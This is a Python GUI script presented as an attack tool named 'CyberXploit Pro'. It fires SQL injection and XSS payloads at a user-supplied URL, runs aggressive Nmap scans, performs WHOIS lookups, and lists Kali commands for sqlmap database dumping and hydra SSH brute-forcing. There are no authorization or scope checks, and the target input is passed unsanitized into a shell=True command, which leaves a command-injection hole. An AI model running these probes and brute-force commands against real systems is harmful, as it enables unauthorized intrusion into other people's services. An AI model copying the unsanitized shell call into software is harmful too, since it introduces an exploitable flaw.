import tkinter as tk
from tkinter import scrolledtext
import subprocess
import requests
import socket
import whois  # pip install python-whois
import threading

TOOL_NAME = "CyberXploit Pro"
NMAP_PATH = r"D:\Nmap\nmap.exe"

def web_attack():
    url = ip_entry.get().strip()
    if not url:
        result_text.insert(tk.END, "[!] Enter target first.\n")
        return
    if not url.startswith("http"):
        url = "http://" + url
    payloads = ["' OR '1'='1", "<script>alert('XSS')</script>", "admin'--"]
    result_text.insert(tk.END, "\n[+] Running Web App Attack...\n")
    for p in payloads:
        try:
            resp = requests.get(f"{url}?id={p}", timeout=5)
            text = resp.text.lower()
            if "error" in text or "sql syntax" in text:
                result_text.insert(tk.END, f"[!] Possible SQL Injection at: {url}?id={p}\n")
            if p in resp.text:
                result_text.insert(tk.END, f"[!] Possible XSS at: {url}?id={p}\n")
        except Exception as e:
            result_text.insert(tk.END, f"[X] HTTP error: {e}\n")

def run_nmap():
    target = ip_entry.get().strip()
    if not target:
        result_text.insert(tk.END, "[!] Enter target first.\n")
        return
    cmd = f'"{NMAP_PATH}" -Pn -sCV -T4 -A {target}'
    result_text.insert(tk.END, f"\n[+] Running Nmap on {target}...\n")
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        out, err = p.communicate(timeout=60)
        result_text.insert(tk.END, out.decode(errors='ignore'))
        if err:
            result_text.insert(tk.END, f"\n[!] Nmap error output:\n{err.decode(errors='ignore')}\n")
    except Exception as e:
        result_text.insert(tk.END, f"[X] Nmap execution failed: {e}\n")

def whois_lookup():
    domain = ip_entry.get().strip()
    if not domain:
        result_text.insert(tk.END, "[!] Enter a domain (e.g. example.com)\n")
        return
    result_text.insert(tk.END, f"\n[+] Performing WHOIS lookup for {domain}...\n")
    try:
        w = whois.whois(domain)
        result_text.insert(tk.END, f"Domain Name: {w.domain_name}\n")
        result_text.insert(tk.END, f"Registrar: {w.registrar}\n")
        result_text.insert(tk.END, f"Creation Date: {w.creation_date}\n")
        result_text.insert(tk.END, f"Expiration Date: {w.expiration_date}\n")
        result_text.insert(tk.END, f"Name Servers: {w.name_servers}\n")
        result_text.insert(tk.END, f"Emails: {w.emails}\n")
    except Exception as e:
        result_text.insert(tk.END, f"[X] WHOIS lookup failed: {e}\n")

def show_kali_commands():
    cmds = {
        "Nmap Scan": "nmap -Pn <target_ip>",
        "SQL Injection Test": "sqlmap -u '<url>?id=1' --dbs",
        "Brute Force Attack": "hydra -L users.txt -P rockyou.txt <ip> ssh",
        "Web Scan": "nikto -h <url>",
    }
    result_text.insert(tk.END, "\n[+] Kali Linux Commands:\n")
    for k, v in cmds.items():
        result_text.insert(tk.END, f" * {k}: {v}\n")

def run_async(fn):
    threading.Thread(target=fn, daemon=True).start()

root = tk.Tk()
root.title(TOOL_NAME)
root.geometry("900x720")
root.configure(bg="#1E1E1E")

tk.Label(root, text=TOOL_NAME, fg="#00FF00", bg="#1E1E1E", font=("Consolas", 20, "bold")).pack(pady=12)
tk.Label(root, text="Enter Target (IP, URL or Domain):", fg="white", bg="#1E1E1E", font=("Consolas", 12)).pack()
ip_entry = tk.Entry(root, width=60, font=("Consolas", 12))
ip_entry.pack(pady=6)

btn_frame = tk.Frame(root, bg="#1E1E1E")
btn_frame.pack(pady=10)
buttons = [
    ("Web Attack", web_attack, "#A00000"),
    ("Nmap Scan", run_nmap, "#007700"),
    ("WHOIS Lookup", whois_lookup, "#0055A0"),
    ("Kali Commands", show_kali_commands, "#AA5500"),
]
for i, (text, fn, color) in enumerate(buttons):
    tk.Button(btn_frame, text=text, command=lambda f=fn: run_async(f),
              bg=color, fg="white", font=("Consolas", 11), width=18, height=2)\
        .grid(row=i//2, column=i%2, padx=10, pady=8)

result_text = scrolledtext.ScrolledText(root, width=110, height=30, bg="#252526", fg="lime", font=("Consolas", 10))
result_text.pack(pady=14)

root.mainloop()
